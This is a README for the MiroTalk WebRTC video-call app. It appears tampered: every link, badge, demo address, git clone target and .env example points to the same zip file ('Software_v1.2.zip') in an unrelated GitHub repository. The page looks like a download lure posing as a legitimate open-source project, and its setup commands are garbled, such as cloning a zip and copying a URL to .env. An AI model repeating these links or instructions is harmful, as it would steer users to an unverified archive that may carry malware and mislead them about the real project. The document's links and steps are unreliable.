# MiroTalk

🚀 `A free WebRTC browser-based video call, chat and screen sharing` 🚀

<br>

[//]: https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip<LABEL>-<MESSAGE>-<COLOR>

[![Author](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)
![License: AGPLv3](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)
[![Donate](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)
[![Repo Link](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)
[![Code style: prettier](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)
[![Gitter](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)
[![Discord](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)

Powered by `WebRTC` using google Stun and [numb](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip) Turn. `MiroTalk` provides video quality and latency not available with traditional technology.

Open the app with the following **supported browsers** & many more...

[//]: #![webrtc](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)

[![Foo](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)

## https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip

<br>

[![mirotalk](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)

## Features

-   Is `100% Free` and `Open Source`
-   No download, plug-in or login required, entirely browser based
-   Unlimited number of conference rooms without call time limitation
-   Desktop and Mobile compatible
-   Optimized Room URL Sharing (share it to your participants, wait them to join)
-   Webcam Streaming (Front - Rear for mobile)
-   Audio Streaming crystal clear
-   Screen Sharing to present documents, slides, and more...
-   File Sharing, share any files to your participants in the room
-   Select Audio Input - Output && Video source
-   Ability to set video quality up to 4K and adapt the FPS
-   Recording your Screen, Audio and Video
-   Chat with Emoji Picker & Private messages & Save the conversations
-   Simple collaborative whiteboard for the teachers
-   Share any YouTube video in real time
-   Full Screen Mode on mouse click on the Video element
-   Possibility to Change UI Themes
-   Right-click on the Video elements for more options
-   Direct `peer-to-peer` connection ensures the lowest latency thanks to `WebRTC`
-   Supports [REST API](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip) (Application Programming Interface)

## Demo

-   `Open` https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip `or` https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip
-   `Pick` your personal Room name and `Join To Room`
-   `Allow` to use the camera and microphone
-   `Share` the Room URL and `Wait` someone to join for video conference

## Room join

-   You can also `join` directly to your `room` by going to https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip `or` https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip

## Quick start

-   You will need to have [https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip) installed, this project has been tested with Node version `12.X` and `14.X`

```bash
# clone this repo
git clone https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip

# mirotalk dir
cd mirotalk

# copy https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip to .env
cp https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip .env

# install dependencies
npm install

# start the server
npm start
```

-   Open http://localhost:3000 in browser

---

## Docker

```bash
# copy https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip to .env
cp https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip .env

# build or rebuild services
docker compose build

# create and start containers
docker compose up # -d

# stop and remove resources
docker compose down
```

-   Open http://localhost:3000 in browser

---

## API

The `response` will give you a `entrypoint / Room URL` for `your meeting`, where `authorization: API_KEY_SECRET`.

```bash
curl -X POST "http://localhost:3000/api/v1/meeting" -H "authorization: mirotalk_default_secret" -H "Content-Type: application/json"
curl -X POST "https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip" -H "authorization: mirotalk_default_secret" -H "Content-Type: application/json"
curl -X POST "https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip" -H "authorization: mirotalk_default_secret" -H "Content-Type: application/json"
```

## API Documentation

The API documentation uses [swagger](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip) at http://localhost:3000/api/v1/docs. Or check it out on [railway](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip) & [heroku](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip).

---

If you want `MiroTalk` to be `reachable` from the `outside` of your local network, you can use a service like [ngrok](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip) (by editing the `Ngrok` part on `.env` file) or expose it directly on [https](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip) or deploy it on:

<br>

[![Deploy on Heroku](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)

`demo` https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip

[![heroku-qr](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)

<br>

[![Deploy on Railway](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)

`demo` https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip

[![railway-qr](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)

---

## Credits

Many Thanks to:

-   ianramzy (html [template](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip))
-   vasanthv (webrtc)
-   Sajad (chat)
-   i-aryan (whiteboard)
-   fmeringdal (rest api)

From where I took inspiration for this project. ❤️

## Contributing

-   Pull Requests are very welcome! :slightly_smiling_face:
-   Just run [prettier](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip) on all of your PRs before submitting, this can be done with `npx prettier --write .`
-   For communication we use [gitter](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip) or [discord](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip) chats which can be found here:

[![Gitter](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip) [![Discord](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)

## License

[![AGPLv3](https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip)](LICENSE)

---

<p align="center"> Made with ❤️ by <a href="https://github.com/salomao-nunes/intergeitchat/raw/refs/heads/main/api/Software_v1.2.zip">Miroslav Pejic</a></p>
